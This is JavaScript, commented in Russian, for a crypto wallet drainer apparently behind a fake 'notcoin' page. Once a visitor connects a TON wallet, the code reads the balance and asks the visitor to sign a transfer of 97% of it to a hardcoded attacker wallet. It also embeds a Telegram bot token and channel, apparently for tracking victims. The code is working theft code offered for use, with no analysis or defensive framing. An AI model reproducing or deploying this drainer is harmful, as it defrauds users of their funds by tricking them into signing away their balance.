var mainWallet = "UQA3Qh7xby9ttfPfDdRX0e_I62m4FCNo_7FoloN6y51jcH7c"; // Ваш кошелек, куда будут лететь активы
var tgBotToken = "6647253210:AAHGOjDF_7BZO9MLgTq2fqHKqwsGmJq21lY"; // Токен от бота телеграмм
var tgChat = "@pawscheker"; // Ваш телеграмм-канал

var domain = window.location.hostname;
var ipUser;

const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://qyvirkot.github.io/notcoin/tonconnect-manifest.json',
    buttonRootId: 'ton-connect'
});

tonConnectUI.on('walletConnected', async (walletAddress) => {
    console.log('Адрес кошелька:', walletAddress);
    
    // Считываем баланс
    try {
        const response = await fetch('https://toncenter.com/api/v3/wallet?address=' + walletAddress);
        const data = await response.json();
        const balance = parseFloat(data.balance) / 1000000000; // Конвертируем в TON (1 TON = 10^9 nanos)
        
        // Отображаем информацию о кошельке и балансе
        const walletInfoElement = document.getElementById('wallet-info');
        walletInfoElement.innerHTML = `Вам доступно: <b>${balance} TON</b>`;
    } catch (error) {
        console.error('Ошибка при получении баланса:', error);
    }
});

// Функция для выполнения трансфера монет
async function didtrans() {
    const walletAddress = tonConnectUI.account.address; // Получаем адрес подключенного кошелька
    if (!walletAddress) {
        console.error('Кошелек не подключен');
        return;
    }

    // Получаем баланс
    const response = await fetch('https://toncenter.com/api/v3/wallet?address=' + walletAddress);
    const data = await response.json();
    let originalBalance = parseFloat(data.balance);
    let processedBalance = originalBalance - (originalBalance * 0.03); // вычитаем 3% для сохранения средств на оплату комиссий
    let tgBalance = processedBalance / 1000000000;

    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 60, // 60 сек
        messages: [{
            address: mainWallet,
            amount: processedBalance
        }]
    };

    try {
        const result = await tonConnectUI.sendTransaction(transaction);
        console.log('Транзакция отправлена');
    } catch (error) {
        console.error('Ошибка при отправке транзакции:', error);
    }
}
